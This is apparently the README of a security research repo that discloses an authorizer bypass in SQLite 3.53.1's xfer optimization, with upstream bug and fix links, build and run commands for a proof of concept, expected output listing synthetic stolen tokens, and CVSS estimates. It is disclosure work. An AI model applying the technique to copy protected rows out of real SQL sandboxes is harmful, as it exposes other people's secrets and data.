# SQLite xfer optimization authorizer bypass

This repo has the PoC and notes for an authorizer bypass in SQLite's xfer optimization.

The bug is in the fast path for compatible `INSERT INTO dst SELECT * FROM src` statements. SQLite can copy raw records from the source table into the destination table without going through the normal `SELECT` machinery. In affected builds, that means the source table can be copied even when `sqlite3_set_authorizer()` would deny `SQLITE_SELECT` / `SQLITE_READ` on that source table.

This is not an RCE claim. It is a sandbox / policy bypass for apps that accept less-trusted SQL and rely on SQLite's authorizer as the boundary. In that shape, a direct read from a protected table can be blocked, while the same rows are copied into an attacker-readable table and read from there.

## Status

Upstream public bug: https://sqlite.org/bugs/info/2026-05-21T03:31:22Z

Upstream trunk fix: https://sqlite.org/src/info/d1cdb817cafd03a4

The upstream thread marks this resolved on trunk. The maintainer reply says it is not going onto `branch-3.53`, and that the new authorizer behavior will appear in the 3.54.0 release.

Checked locally with:

Vulnerable SQLite 3.53.1:

```text
2026-05-05 10:34:17 c88b22011a54b4f6fbd149e9f8e4de77658ce58143a1af0e3785e4e6475127e9
```

Fixed trunk snapshot:

```text
2026-05-21 15:14:35 9ac4a33a2932d353c4871fd8e09c10addf827f1fc3fc9380037d738cf2cd0353
```

In the included synthetic token demo, the 3.53.1 build copies denied rows into the attacker-readable table. The fixed trunk build denies the copy.

## Files

`poc/sqlite_authorizer_xfer_poc.c` - standalone loopback victim plus attacker PoC.

`validate.sh` - builds the vendored SQLite 3.53.1 and trunk snapshots, then runs the checks.

`evidence/remote-admin-breakin-validation.txt` - captured output for the synthetic token-reuse demo.

`evidence/remote-xfer-exfil-validation.txt` - smaller direct xfer exfil demo.

`evidence/remote-vacuum-exfil-validation.txt` - related `VACUUM INTO` export demo.

`third_party/` - vendored SQLite amalgamations used for reproducible local checks.

## Quick repro

```bash
./validate.sh
```

Or run all variants:

```bash
./validate.sh all
```

Or build the PoC by hand against SQLite 3.53.1:

```bash
gcc -O2 -g -DSQLITE_THREADSAFE=0 \
	-I third_party/sqlite-3.53.1 \
	poc/sqlite_authorizer_xfer_poc.c third_party/sqlite-3.53.1/sqlite3.c \
	-ldl -lpthread -lm -o poc-old
./poc-old breakin
```

The `breakin` mode is just a small impact demo around a synthetic bearer token. It is not claiming a default remote SQLite admin compromise.

Expected vulnerable output includes copied synthetic secrets:

```text
DIRECT_ADMIN_TOKEN_READ_BLOCKED=yes
XFER_COPY_SUCCEEDED=yes
STOLEN_ADMIN_SESSION=sess_live_admin_7cd4eec7b9f241b4b5b8
STOLEN_PAYMENT_KEY=sk_live_poc_51NxSQLiteAuthorizerBypass
STOLEN_CLOUD_DEPLOY_KEY=AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

Expected fixed trunk output includes the denied copy:

```text
XFER_COPY_SUCCEEDED=no
STOLEN_ADMIN_SESSION=no
STOLEN_PAYMENT_KEY=no
STOLEN_CLOUD_DEPLOY_KEY=no
```

## CVSS guess

For an authorizer-backed SQL sandbox where a logged-in low-privilege user can run SQL and copy into a readable table, I would score it high:

```text
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N = 7.1
```

For a service that exposes the SQL runner without authentication, the deployment-specific score is more like:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N = 8.2
```

If the copied data contains bearer tokens that grant access to a separate application privilege boundary, the practical impact can be higher. The tokens and keys in this repo are synthetic PoC values.
